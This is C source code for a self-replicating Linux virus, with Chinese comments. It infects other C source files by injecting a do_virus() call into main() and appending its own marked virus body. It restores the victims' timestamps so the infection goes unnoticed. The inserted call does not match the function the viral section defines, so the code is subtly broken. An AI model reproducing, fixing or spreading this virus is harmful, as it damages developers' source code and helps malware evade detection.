/* linux virus start */
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <utime.h>

#define VIRNAME    "test2.c"
#define BUFSIZE   200

char currentPath[BUFSIZE]="";

int infect(char *file_name)
{
    getcwd(currentPath,BUFSIZE);
    strcat(currentPath,"/");
    strcat(currentPath,VIRNAME);
    printf("currentPath1 = %s\n",currentPath);

    //需要感染的目标文件，已经被病毒文件，和一个临时文件
    FILE *fp_obj,*fp_vir,*fp_tmp;
    //对文件一行一行的的扫描，每行的最大容量
    char buf[BUFSIZE];
    //一个标识，对文件感染的判断
    int flag;
    //临时文件名
    char *tmp_buf;
    //得到目标文件的stat
    struct stat statBuf;
    //用来放置文件的访问时间和修改时间
    struct utimbuf timeBuf;

    //打开目标文件，用于读写
    if ((fp_obj=fopen(file_name,"r+"))==NULL)
    {
        printf("open object file %s failure !!!\n",file_name);
        return 1;
    }
    //得到目标文件的stat
    if (stat(file_name,&statBuf) < 0)
    {
        printf("get object file %s stat failure !!\n",file_name);
        return 1;
    }
    //存放目标文件的修改时间和访问时间，这个避免被发现文件已被感染
    timeBuf.actime = statBuf.st_atime;
    timeBuf.modtime = statBuf.st_mtime;
    //打开被感染的病毒源文件
    if ((fp_vir=fopen(currentPath,"r"))==NULL)
    {
        printf("open virus file %s failure !!\n",currentPath);
        return 1;
    }
    //新建一个临时文件
    if ((tmp_buf=tmpnam(NULL))==NULL)
    {
        printf("create temp file failure !!\n");
        return 1;
    }
    //打开临时文件，每次都是在临时文件中添加内容
    if ((fp_tmp=fopen(tmp_buf,"a+"))==NULL)
    {
        printf("open temp file failure !!\n");
        return 1;
    }
    //使用完后删除临时文件
    unlink(tmp_buf);

    flag = 1;
    //一行一行遍历目标文件
    while (fgets(buf,BUFSIZE,fp_obj) != NULL)
    {
        //目标文件已被感染的标志
        if (!strcmp(buf,"/* linux virus start */\n"))
        {
            printf("object file %s has been infected !!\n",file_name);
            return 0;
        }
        //目标文件有main函数，改变标志
        if (flag == 1 && strstr(buf,"main("))
        {
            flag = 0;
        }
        //在main函数结束前插入调用病毒感染的函数
        if (flag == 0 && (strstr(buf,"return") ||
                          strstr(buf,"}")))
        {
            //插入条用函数，改变标志
            fputs("\tdo_virus();\n",fp_tmp);
            flag = 2;
        }
        //将目标文件放入临时文件中
        fputs(buf,fp_tmp);
    }
    //目标文件没有main函数，即不会被感染，直接返回
    if (flag != 2)
    {
        printf("object don't main function !!\n");
        return 0;
    }

    flag = 1;
    //遍历带毒文件，提取带毒文件的带毒部分
    while (fgets(buf,BUFSIZE,fp_vir) != NULL)
    {
        //找到带毒部分的开始，改变标志
        if (flag == 1 && !strcmp(buf,"/* linux virus start */\n"))
        {
            flag = 0;
        }
        //没有遍历到带毒部分时，继续读取下一行
        if (flag == 1)
        {
            continue;
        }
        //当带毒部分读取完后，结束遍历
        if (flag == 2)
        {
            break;
        }
        //遍历到带毒部分结束部分，改变标志
        if (!strcmp(buf,"/* linux virus end */\n"))
        {
            flag = 2;
        }
        //改变带毒文件的文件名
        if (strstr(buf,"#define VIRNAME") &&
            buf[0]=='#')
        {
            snprintf(buf,sizeof(buf),"%s\t\"%s\"\n",
                     "#define VIRNAME",file_name);
        }
        //将带毒部分添加到目标文件的源码后面
        fputs(buf,fp_tmp);
    }
    //关闭带毒文件
    fclose(fp_vir);

    //重置文件指针
    rewind(fp_tmp);
    rewind(fp_obj);
    //将临时文件的内容覆盖掉目标文件的内容
    while (fgets(buf,BUFSIZE,fp_tmp) != NULL)
    {
        fputs(buf,fp_obj);
    }
    //关闭临时文件和目标文件
    fclose(fp_tmp);
    fclose(fp_obj);

    //设置目标文件的访问时间和修改时间为原来的时间
    if (utime(file_name,&timeBuf) < 0)
    {
        printf("set access and modify time failure !!!\n");
        return 1;
    }
    return 0;
}
/* linux virus end */

int main(int argc, char **argv)
{
    infect(argv[1]);
    return 0;
}
